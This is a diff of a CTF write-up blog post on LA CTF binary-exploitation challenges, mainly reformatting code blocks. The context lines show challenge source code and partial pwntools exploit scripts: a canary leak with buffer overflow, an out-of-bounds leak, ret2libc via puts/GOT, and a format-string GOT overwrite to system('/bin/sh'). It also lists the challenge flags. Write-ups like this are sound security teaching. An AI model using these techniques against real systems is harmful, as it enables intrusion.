@@ -247,9 +247,10 @@ The matching combination was "dpddpdpp". With that, we have everything we need
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/34702286-9d84-4765-98c8-aba4cf0857d6)
 
-### Source Code
+<details>
+<summary>Source Code</summary>
 
-{% highlight c %}
+ ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -319,11 +320,12 @@ int main(void) {
     }
   }
 }
-{% endhighlight %}
+```
+</details>
 
 We immediately notice the use of gets() so theres a buffer overflow. 
 
-```python
+```bash
 └─$ checksec --file=aplet123
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols        No    0               3               aplet123
@@ -343,9 +345,10 @@ We will modify our payload to add "i'm" at the end to take advantage of the s+4 
 
 Now that we have a canary leak, we can just use the buffer overflow to overwrite the saved return address to print_flag()
 
-### Exploit Script
+<details>
+<summary>Exploit Script</summary>
 
-{% highlight python %}
+ ```py
 #!/usr/bin/python
 from pwn import *
 import warnings
@@ -387,15 +390,17 @@ p.interactive()
 
 # lactf{so_untrue_ei2p1wfwh9np2gg6} 
 
-{% endhighlight %}
+```
+</details>
 
 ## Pwn/52 Card Monty
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/04046e49-dccc-4253-af8f-efa93b818930)
 
-### Source Code
+<details>
+<summary>Source Code</summary>
 
-{% highlight c %}
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -497,11 +502,12 @@ int main() {
   game();
   return 0;
 }
-{% endhighlight %}
+```
+</details>
 
 We have an Out-Of-Bound read because the deck size is 52 while it checks to make sure the index we provide is within 0x52 (82 in decimal). Additionally, there is a BOF and win function inside.
 
-```python
+```bash
 └─$ checksec --file=monty 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols        No    0               2               monty
@@ -509,9 +515,10 @@ Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RU
 
 PIE and stack canary is enabled. With the 2 leaks that we can get, its clear that we should leak the canary and elf address. After looking around in gdb, we have determined that the canary is located at index 55 and we can get an elf leak at index 57.
 
-### Exploit Script
+<details>
+<summary>Exploit Script</summary>
 
-{% highlight python %}
+```py
 #!/usr/bin/python
 from pwn import *
 import warnings
@@ -556,7 +563,8 @@ p.sendlineafter(b"lady! ", "1")
 p.sendlineafter(b"Name: ", payload)
 
 p.interactive()
-{% endhighlight %}
+```
+</details>
 
 > Flag : lactf{m0n7y_533_m0n7y_d0}
 
@@ -564,9 +572,10 @@ p.interactive()
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c2483fba-441e-420a-9f16-a6fdddafe1e7)
 
-### Source Code
+<details>
+<summary>Source Code</summary>
 
-{% highlight c %}
+```c
 #include <stdio.h>
 
 void sus(long s) {}
@@ -579,7 +588,8 @@ int main(void) {
   gets(buf);
   sus(u);
 }
-{% endhighlight %}
+```
+</details>
 
 Theres not much going on in this binary. Theres no win function that we can return to with the buffer overflow so we will probably need a libc leak. Since PIE is disabled, we can overwrite the return address with the PLT address of puts() with the GOT address of any function as the argument.
 
@@ -590,7 +600,7 @@ So when we call the PLT address of puts(), its the same as directly calling the 
 
 In my script, I will leak the GOT address of gets(). Now the problem is, how do we pass the GOT address of gets() as an argument without pop_rdi gadget in the binary? Thats where the sus() function comes in. The sus() function takes the variable u as an argument (it would pop the value of u into rdi in assembly). Since we also have an overflow, we can modify the content of u and control what is popped into the rdi.
 
-{% highlight python %}
+```py
 payload = b"A" * 56
 payload += p64(getsGot) * 2         # overwrite u with the GOT address of gets
 payload += p64(putsPlt)             # call puts()
@@ -610,7 +620,7 @@ p.sendlineafter(b"sus?\n", payload)
 leak = p.recvline().strip().ljust(8, b"\x00")
 leak = u64(leak)
 log.info(f"Puts leak : {hex(leak)}")
-{% endhighlight %}
+```
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/2e405863-ea53-4fe8-9be5-604b118dec21)
 
@@ -620,9 +630,10 @@ Now that we have leaked the address of a function in libc, its time to find the 
 
 Download any of the libc versions to test. Now that we have the correct version, we can calculate the base of libc by attaching gdb to it and run "vmmap" to see the base of libc. With that, we have all the information we need to trigger a ret2system.
 
-### Exploit Script
+<details>
+<summary>Exploit Script</summary>
 
-{% highlight python %}
+```py
 #!/usr/bin/python
 from pwn import *
 import warnings
@@ -690,7 +701,8 @@ payload += p64(system)
 p.sendlineafter(b"sus?\n", payload)
 
 p.interactive()
-{% endhighlight %}
+```
+</details>
 
 > Flag : lactf{amongsus_aek7d2hqhgj29v21}
 
@@ -698,9 +710,10 @@ p.interactive()
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/f02ed5bf-381d-4393-8e66-56cd0d949531)
 
-### Source Code
+<details>
+<summary>Source Code</summary>
 
-{% highlight c %}
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -750,7 +763,8 @@ int main(void) {
     }
   }
 }
-{% endhighlight %}
+```
+</details>
 
 Theres a format string vulnerability when we enter a custom topping.
 
@@ -764,7 +778,7 @@ Since there is Partial RELRO, the first thing that came to my mind was a GOT ove
 
 For a GOT overwrite attack, we will need a leak to the elf base and libc. To do this, we will pass n "%p" to printf to leak addresses from the stack. Then, we can pass in "%1$p%2$p......$50$p" to continue leaking the next address in the stack up to %50$p (this means something like the 50th item on the stack). Eventually we will find a libc and elf address. In my case, I found a libc address at %5$p and an elf address at $49$p.
 
-{% highlight python %}
+```py
 format1 = "AAAA.%5$p"
 format2 = ".%49$p"
 
@@ -786,26 +800,27 @@ leak = int(top2[-1], 16)
 log.info(f"elf leak : {hex(leak)}")
 exe.address = leak - (0x56113f613189 - 0x0056113f612000)
 log.info(f"elf base : {hex(exe.address)}")
-{% endhighlight %}
+```
 
 ![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/4d593224-9392-4a95-ba0a-9c2694b22e7d)
 
 Then, we need to look for a good target to overwrite its GOT into system. strcpy() looks like a good target because I can enter /bin/sh into the topping and call strcpy() on /bin/sh which is the same as system("/bin/sh")
 
-{% highlight python %}
+```py
 offset = 6
 payload = fmtstr_payload(offset, {strcpyGot:systemSym})
 #print(len(payload))
 print(payload)
 assert(len(payload) < 100)
 custom(payload)
-{% endhighlight %}
+```
 
 We can send the payload and get a shell
 
-### Exploit Script
+<details>
+<summary>Exploit Script</summary>
 
-{% highlight python %}
+```py
 #!/usr/bin/python
 from pwn import *
 import warnings
@@ -880,8 +895,11 @@ p.sendlineafter(b"> ", "0")
 
 #gdb.attach(p)
 p.interactive()
-#lactf{golf_balls_taste_great_2tscx63xm3ndvycw}
-{% endhighlight %}
+```
+</details>
+
+
+> Flag : lactf{golf_balls_taste_great_2tscx63xm3ndvycw}
 
 ### Disclaimer
 
